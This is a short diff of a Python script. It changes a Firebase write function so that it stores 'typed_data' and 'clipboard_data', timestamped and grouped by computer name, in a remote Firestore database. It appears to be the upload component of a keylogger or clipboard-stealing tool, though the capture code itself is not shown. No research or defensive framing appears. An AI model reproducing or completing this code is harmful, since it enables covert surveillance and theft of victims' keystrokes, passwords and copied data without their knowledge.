@@ -1,4 +1,5 @@
 
+from datetime import datetime
 import firebase_admin
 from firebase_admin import credentials
 from firebase_admin import firestore
@@ -12,9 +13,11 @@ firebase_admin.initialize_app(cred,{
 })
 db = firestore.client()
 
-def write_data(data):
-    db.collection('users').document('mHi4Kcg4DP3iLHKrU3kO').set({
-        'name': data,
+def write_data(data, comname):
+    db.collection(comname).document(str(datetime.now().strftime("%Y-%m-%d_%H%M%S"))).set({
+        'typed_data' : data['typed_data'],
+        'clipboard_data' : data['clipboard_data'],
+        'date_time': datetime.now().strftime("%Y-%m-%d_%H%M%S"),
     }, merge= True)
 
 
